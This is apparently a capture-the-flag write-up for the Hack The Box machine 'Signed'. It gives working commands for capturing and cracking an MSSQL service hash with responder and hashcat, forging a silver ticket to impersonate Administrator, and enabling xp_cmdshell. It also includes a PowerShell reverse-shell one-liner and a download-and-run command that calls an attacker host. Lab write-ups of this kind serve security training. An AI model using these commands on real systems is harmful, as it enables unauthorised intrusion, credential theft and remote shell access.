---
tags:
  - Windows
  - Medium
  - MSSQL
  - Impersonation
  - Silver_Ticket
  - responder
  - impacket-ticketer
---
![banner.png](Images/banner.png)

**Important Note:** This is an assumed breach box and given `scott:Sm230#C5NatH`.

## User

### Port Scan

As always, we first start off with an nmap scan. Looking at the results, we have just one port open: MSSQL.

```
# Nmap 7.95 scan initiated Sat Oct 11 19:08:53 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oA nmap/signed 10.129.242.173
Nmap scan report for 10.129.242.173
Host is up, received echo-reply ttl 127 (0.049s latency).
Scanned at 2025-10-11 19:08:53 GMT for 60s
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON          VERSION
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-11T19:07:10
| Not valid after:  2055-10-11T19:07:10
| MD5:   d24b:3348:a408:255a:dc28:050a:74fb:671c
| SHA-1: 4e19:cdb8:93c0:4051:ed58:196f:2a29:cc1a:2f83:ebcc
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQLhIKF59naatEjj9kTYhszDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMDExMTkwNzEwWhgPMjA1NTEwMTExOTA3MTBaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAPTT91sL
| SqlmP3tu5nx7WAyvbWYZhEj90CMjrcr/7/4dfufQMy9A9a//6gxIZlTapJ/QbpRN
| RB/eF5fBnmHADnpj3KqWHb/BYGTK6eqAnG5wnI20OavXmgAgYHvq+yxhy70/k7ve
| MEhp1kW84cRFD8dRx6igtH1Iz6pXJUYmtce0iuVDWNNq2Lidwhn/xNvvc6E3t2pz
| xloZz7w3E0dTUD3usxcIRRW3xbs1AJsIOwMmDK0ZWnpPJ+NZbh1qWmePplUtTAlC
| pteMVq02lVHuQBrX0WVqm3dDygj9DHyLWBwXYIvhe9VtU9X4zWCrbALPitxPgLuQ
| 8vQI5x0eHgreipJaT/3xeYWe1NFPnQKQ4IIRTfHzRruyKMaWRHlWykIh9YsbZG8s
| AX6/buKzm1tH49D3BLEsBFn7P61nN5qgprx1nHB9Q/4GzsR2lb9nWTg1+1qsiWlt
| 9ikNvYIVxUWkpzQ9qjAzO0o+Sl0a6ZSHMuZVvvbmOUMZWZeL4fMQ5F51rQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQBt9QubDlMMofQgShchqT7GZczZysfTnB5ZcRBx
| rq3syrQjsB7qWBYtDxjJAGfBFNZOTZPv/paMg5T1mp9MfYomPHbfZXYZV9TbjHlJ
| Qmo57ldGzsX5XC9Wp/X8J3hkEY0NxzDDPgfEFRhFKsUbBEJkyJmhLGweKN6YavAZ
| sQPHO2VRkUqBt8rMfNaNWd/2olajC1ggd9IlvDqMkafuM2dQXcgUF00CFD+NMRKi
| O1iAYSwL1eyiXeK5lVWY1wiHEPERwQZdl4hseBteiWHhRdd9cRlnRPlKORgg7V91
| eLLtNnx6BnqCuB4sTXKWZLGLCnlbMqZbTc+QZdUCxmfcf2PmmtNxf7QNvTunree0
| yEEZ7UPEhhpia6gY4RwEl8e08L5I1rbKn+eln0ndsplNlsGmF1p1jeH5o6LmeSaZ
| B+X6Z7x7t7OO5+kkLD9RbPZNgxoogwYQ+0BMUqlBiFnbrRlVH9rYjQVsvtQmgxhm
| LK94oHfaLZoC+e4kJYp85XjURPc=
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-11T19:09:53+00:00; 0s from scanner time.

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 11 19:09:53 2025 -- 1 IP address (1 host up) scanned in 60.44 seconds
```

### Cracking MSSQLSVC's Hash

Given we only have one port open, let's try to use our breached credentials to log in to `mssql`. First, based on our `nmap` scan, we add `signed.htb`, `dc01.signed.htb`, and `dc01` to our `/etc/hosts` file. Then, we can use `impacket-mssqlclient` to log in to `mssql`.

`impacket-mssqlclient 'SIGNED/scott:Sm230#C5NatH@10.129.242.173`

After logging in and listing the databases, there don't seem to be any non-default databases.

![default dbs.png](Images/default%20dbs.png)

Let's use a trick to get the hash of the `mssql` service account. First, in a new pane, we start `responder` with the following:

`sudo responder -I tun0 -v`

Then, we can send an `smb` request to `responder` by using `xp_dirtree` in our `mssql` client. Running `exec dirtree '\\<attacker ip>\something\random';` should send the hash to `responder`.

![responder hash.png](Images/responder%20hash.png)

We can copy this hash to a file `mssqlsvc.hash` and crack it with the following `hashcat` command:

`hashcat -a 0 mssqlsvc.hash ~/Documents/rockyou.txt`

This produces a password of `purPLE9795!@`.

![hash crack.png](Images/hash%20crack.png)

### Impersonating Administrator with a Silver Ticket

Now, we can log in to `mssql` as `mssqlsvc` with `impacket-mssqlclient`, but in a slightly different variation. This way, it prompts for the password instead of passing it in. Using this variation helps get around the weird `@` special character which messes up authentication.

`impacket-mssqlclient 'mssqlsvc@10.129.242.173 -windows-auth`

![mssqlsvc login.png](Images/mssqlsvc%20login.png)

Using the following query, we can enumerate what user logins and groups are sysadmins on `mssql`.

`SELECT mp.name AS login_name, CASE WHEN mp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status, mp.type_desc AS login_type FROM sys.server_role_members srp JOIN sys.server_principals mp ON mp.principal_id = srp.member_principal_id JOIN sys.server_principals rp ON rp.principal_id = srp.role_principal_id WHERE rp.name = 'sysadmin' ORDER BY mp.name;`

![seeing it group.png](Images/seeing%20it%20group.png)

As seen in the screenshot, one such group is `SIGNED\IT`. Because we have the `mssql` service account, we can create a silver ticket that utilizes this group to impersonate `Administrator`. First, we need to identify the group ID for it. We can do this by using `nxc` and `--rid-brute` to list out all the groups and users, letting us find the group ID specifically for `IT`. We'll also need the ID for the `mssqlsvc` user, so we'll grab that too.

`nxc mssql 10.129.242.173 -u 'mssqlsvc' -p 'purPLE9795!@' --rid-brute | grep 'IT\|mssqlsvc'`

![getting ids.png](Images/getting%20ids.png)

We've identified the user ID of `mssqlsvc` to be `1103` and the `IT` group to have an ID of `1105`. Another bit of information we need is the `NTLM` hash of `mssqlsvc`. We already have the password, so we just have to convert it to an `NTLM` hash. This can be performed using a Python script, such as the one below.

<u>passtontlm.py</u>

```
# passtontlm.py
from Crypto.Hash import MD4


def ntlm_hash(password: str) -> str:
    pw_bytes = password.encode("utf-16le")  # UTF-16LE encoding
    h = MD4.new()
    h.update(pw_bytes)
    return h.hexdigest()


if __name__ == "__main__":
    pw = input("Enter a password: ")
    print(ntlm_hash(pw))
```

Running this script and inputting `mssqlsvc`'s password produces the `NTLM` hash:

![making ntlm.png](Images/making%20ntlm.png)

The final piece is to get the domain SID. We can use the following query in `mssql` to get the SID for our current user:

`SELECT SUSER_SID('SIGNED\mssqlsvc')`

![getting hex sid.png](Images/getting%20hex%20sid.png)

We can then put this byte stream into a Python script that will convert it to our domain SID.

<u>bytetosid.py</u>

```
#!/usr/bin/env python3
import struct
import binascii


def parse_sid(hex_sid: str):
    # Strip leading "0x", "b''", etc.
    hex_sid = hex_sid.strip().replace("b'", "").replace("'", "")
    sid_bytes = binascii.unhexlify(hex_sid)

    revision = sid_bytes[0]
    subauth_count = sid_bytes[1]

    # Identifier authority is big-endian 6-byte integer
    ident_auth = int.from_bytes(sid_bytes[2:8], byteorder="big")

    # Subauthorities are little-endian 4-byte integers
    subauths = []
    offset = 8
    for _ in range(subauth_count):
        val = struct.unpack("<I", sid_bytes[offset : offset + 4])[0]
        subauths.append(val)
        offset += 4

    # Full SID
    full_sid = f"S-{revision}-{ident_auth}-" + "-".join(str(x) for x in subauths)

    # Domain SID = all but the last RID
    domain_sid = f"S-{revision}-{ident_auth}-" + "-".join(str(x) for x in subauths[:-1])

    return {
        "revision": revision,
        "identifier_authority": ident_auth,
        "subauthorities": subauths,
        "full_sid": full_sid,
        "domain_sid": domain_sid,
    }


if __name__ == "__main__":
    # Example from your SQL output:
    hex_sid = input(
        "Enter MSSQL bytes from \"SELECT SUSER_SID('[domain]\\[user]');\" : "
    )

    sid_info = parse_sid(hex_sid)

    print("Revision:", sid_info["revision"])
    print("Identifier Authority:", sid_info["identifier_authority"])
    print("Subauthorities:", sid_info["subauthorities"])
    print("Full SID:", sid_info["full_sid"])
    print("Domain SID:", sid_info["domain_sid"])
```

![getting domain sid.png](Images/getting%20domain%20sid.png)

With these pieces of information, we can create a silver ticket that impersonates `Administrator` using `impacket-ticketer` (note that the `512` group is for `Domain Admins`):

`impacket-ticketer -user-id 1103 -spn 'MSSQLSVC/DC01.SIGNED.HTB:1433' -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -dc-ip 10.129.242.173 -groups 512,1105 "Administrator"`

![creating admin impersonating tgt.png](Images/creating%20admin%20impersonating%20tgt.png)

This saves a TGT called `Administrator.ccache` that we can use to log in to `mssqlsvc`, impersonating `Administrator`.

`KRB5CCNAME=Administrator.ccache impacket-mssqlclient -k dc01.signed.htb`

![logging in impersonating admin.png](Images/logging%20in%20impersonating%20admin.png)

### Obtaining a Reverse Shell

With administrative permissions on `mssql`, we can enable `xp_cmdshell` which will let us execute commands. We can run the following queries to enable it:

`sp_configure 'show advanced options', '1'`
`RECONFIGURE`
`sp_configure 'xp_cmdshell', '1'`
`RECONFIGURE`

![enabling xp_cmdshell.png](Images/enabling%20xp_cmdshell.png)

Before we get a reverse shell, we need to host a .ps1 file that can act as our payload. I Like the following one from `nishang` (uncommenting the first one-liner and deleting the second one):

<u>Invoke-PowerShellTcpOneLine.ps1</u>

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Finally, we host that .ps1 file on a Python web server, set up `penelope` or `nc` as our listener, and run the following query to pop our reverse shell:

`EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23:8000/rev.ps1") | powershell -noprofile'`

![getting rev shell.png](Images/getting%20rev%20shell.png)

This gives us `user.txt`.

![getting user.png](Images/getting%20user.png)

## Root

Despite us having been impersonating `Administrator` in `mssql`, the shell we drop into doesn't have administrative permissions. However, we do still have that level of privilege on the `mssql` client. Going back to our `mssql` session (which you may have to relaunch after the rev shell execution), we can use `OPENROWSET` to read files in the client. We can run the following to get `root.txt`:

`SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS TextFile;`

![getting root.png](Images/getting%20root.png)

Some people seem to say that you can get an `Administrator` shell by using named pipes and `NtObjectManager`. Another writeup I briefly saw before being taken down was able to get `Administrator`'s password from some kind of file read using `OPENROWSET`, and then used `RunasCs.exe` to get an `Administrator` shell. I haven't been able to get either to work, so this will suffice for now. Check out `ippsec`'s video when it drops and he might know.

## Credential List

| Username | Password     | Description                                                     |
| -------- | ------------ | --------------------------------------------------------------- |
| scott    | Sm230#C5NatH | Gives MSSQL access for kevin (assumed breach)                   |
| mssqlsvc | purPLE9795!@ | Gives MSSQL access as mssqlsvc and leads to admin impersonation |
